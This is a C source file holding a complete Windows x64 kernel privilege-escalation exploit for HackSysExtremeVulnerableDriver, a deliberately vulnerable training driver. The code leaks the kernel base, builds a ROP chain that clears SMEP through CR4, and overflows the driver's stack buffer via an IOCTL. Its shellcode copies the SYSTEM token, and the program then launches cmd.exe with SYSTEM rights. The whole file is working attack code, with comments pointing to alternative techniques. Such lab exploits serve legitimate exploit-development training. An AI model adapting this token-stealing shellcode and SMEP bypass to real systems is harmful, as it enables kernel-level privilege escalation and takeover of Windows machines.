#include<windows.h>
#include<stdio.h>
#include<psapi.h>
#pragma comment(lib,"psapi")

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HEVD_STACK_BOF_IOCTL 0x222003ul

UINT64 movcr4rcx = 0x000000000039dbe7;// : mov cr4, rcx; ret
UINT64 poprcx = 0x0000000000205dbc;// : pop rcx; ret

int main() {
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    HANDLE dh = CreateFileA(FileName,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);
    LPVOID* LpImageBase = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,8 * 1024);
    DWORD cbNeeded = 0;
    EnumDeviceDrivers(LpImageBase, 8 * 1024, &cbNeeded); // There's another technique to get kernel base. https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c#L7 
    UINT64 KernelBase = *(UINT64*)LpImageBase;
    movcr4rcx += KernelBase;
    poprcx += KernelBase;
    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8\x00\x00\x00\x4D\x8B\x88\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x70\x24\xF0\x49\x89\x80\xB8\x04\x00\x00\x48\x31\xC0\x48\x31\xF6\x4D\x31\xE4\x48\x83\xC4\x38\x41\x5E\xC3";
    LPVOID user_shellcode = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    FillMemory(user_shellcode, 0x1000, 0x41);
    memcpy(user_shellcode, shellcode, sizeof(shellcode));
    int BytesReturned = 0;
    UINT64 ropchain[] = { poprcx,0x406f8, // other ways to bypass SMEP exist. https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/,https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
                         movcr4rcx,user_shellcode};
    char* payload = (char*)malloc(0x1000);
    memset(payload, 0x41, 0x818);
    memcpy(payload + 0x818, (char*)ropchain, 0x20);
    DeviceIoControl(dh,HEVD_STACK_BOF_IOCTL,payload,0x838,NULL,0,&BytesReturned,NULL);
    // Ideally, you should check if you're system here. https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c#L34
    system("cmd.exe"); // You can use CreateProcess() as well. https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c#L74
    HeapFree(GetProcessHeap(), 0, LpImageBase);
    CloseHandle(dh);
    return 0;
}
